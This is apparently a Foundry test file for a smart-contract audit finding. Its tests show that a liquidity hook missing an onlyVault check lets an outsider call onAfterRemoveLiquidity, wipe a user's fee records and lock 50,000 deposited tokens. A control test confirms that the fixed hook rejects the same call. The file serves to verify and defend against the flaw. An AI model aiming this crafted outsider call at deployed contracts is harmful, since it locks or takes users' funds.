// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, BPT, Hook, Bob, RemoveLiquidityKind} from "./49676-critical-malicious-user-can-delete-all-users-deposited-liqui.sol";

contract Finding49676Test is Test {
    function test_exploit_missing_onlyVault_wipes_fee_data() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.wipedTo(), 0, "fee rows deleted");
        assertTrue(e.removeReverted(), "remove reverts");
        assertEq(e.locked(), 50_000 ether, "50_000 BPT stuck");
        assertEq(e.token().balanceOf(address(e.hook())), 50_000 ether, "hook holds the deposit");
        assertEq(e.token().balanceOf(address(e.bob())), 0, "bob got nothing");
    }

    function test_control_onlyVault_keeps_the_rows_and_bob_withdraws() public {
        BPT token = new BPT();
        address pool = address(new BPT());
        Hook fixedHook = new Hook(token, pool, true);
        Bob bob = new Bob();
        token.mint(address(bob), 50_000 ether);
        for (uint256 i = 0; i < 5; i++) {
            bob.deposit(fixedHook, token, 10_000 ether);
        }

        uint256[] memory zeros = new uint256[](2);
        (bool wiped,) = address(fixedHook).call(
            abi.encodeWithSignature(
                "onAfterRemoveLiquidity(address,address,uint8,uint256,uint256[],uint256[],uint256[],bytes)",
                address(this),
                pool,
                uint8(RemoveLiquidityKind.PROPORTIONAL),
                50_000 ether,
                zeros,
                zeros,
                zeros,
                abi.encodePacked(address(bob))
            )
        );

        assertFalse(wiped, "outsider wipe reverted");
        assertEq(fixedHook.feeLength(address(bob)), 5, "rows remain");
        assertTrue(bob.take(fixedHook, 50_000 ether), "bob withdraws");
        assertEq(token.balanceOf(address(bob)), 50_000 ether, "bob recovered BPT");
        assertEq(token.balanceOf(address(fixedHook)), 0, "hook empty");
    }
}
